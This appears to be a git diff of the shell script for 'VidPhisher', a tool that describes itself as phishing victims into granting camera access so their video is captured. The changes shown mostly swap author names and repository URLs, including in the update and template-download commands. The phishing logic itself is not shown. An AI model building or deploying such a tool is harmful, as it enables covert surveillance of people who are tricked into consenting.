@@ -3,13 +3,13 @@
 # VidPhisher
 # Version    : 1.2
 # Description: VidPhisher is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
-# Author     : Augustine-Tilo
-# Github     : https://github.com/crithinker
-# Email      : lifeofacriticalthinker@gmail.com
+# Author     : KasRoudra
+# Github     : https://github.com/KasRoudra
+# Email      : kasroudrakrd@gmail.com
 # Credits    : TechChipNet, RecordRTC
 # Date       : 05-06-2022
 # License    : GPLv3
-# Copyright  : Augustine-Tilo 2022
+# Copyright  : KasRoudra 2022
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -85,7 +85,7 @@ patents cannot be used to render the program non-free.
   The precise terms and conditions for copying, distribution and
 modification follow.
 
-Copyright (C) 2022 KasRoudra (https://github.com/crithinker)
+Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
 LicenseInfo
 
 
@@ -124,7 +124,7 @@ ${cyan} \ \ / /| |/ _' | |_) | '_ \| / __| '_ \ / _ \ '__|
 ${purple}  \ V / | | (_| |  __/| | | | \__ \ | | |  __/ | 
 ${yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_| 
 ${red}                                          [v${version}] 
-${blue}                                  [By Augustine-Tilo] 
+${blue}                                  [By KasRoudra] 
 "
 
 ngrok_help="
@@ -463,14 +463,14 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/crithinker/VidPhisher/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/crithinker/VidPhisher/main/files/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/changelog.log)
     clear
     echo -e "$logo"
     echo -e "${info}VidPhisher has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -478,7 +478,7 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf VidPhisher vidphisher && git clone https://github.com/crithinker/VidPhisher
+            cd .. && rm -rf VidPhisher vidphisher && git clone https://github.com/KasRoudra/VidPhisher
             echo -e "\n${success}VidPhisher updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
@@ -632,14 +632,14 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[VidPhisher]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Video Phishing tool]
-$red[Author]     ${cyan} :[Augustine-Tilo]
-$red[Github]     ${cyan} :[https://github.com/crithinker]
-$red[Email]      ${cyan} :[lifeofacriticalthinker@gmail.com
-]"
+$red[Author]     ${cyan} :[KasRoudra]
+$red[Github]     ${cyan} :[https://github.com/KasRoudra]
+$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
+$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
         printf "$vp_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/crithinker/Vidphisher#My-Best-Works"
+        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -663,7 +663,7 @@ if [ -e websites.zip ]; then
 fi
 
 if ! [ -d sites ]; then
-    wget -q --show-progress https://github.com/crithinker/VidPhisher/releases/latest/download/websites.zip
+    wget -q --show-progress https://github.com/KasRoudra/VidPhisher/releases/latest/download/websites.zip
     mkdir sites
     unzip websites.zip -d sites > /dev/null 2>&1
     rm -rf websites.zip
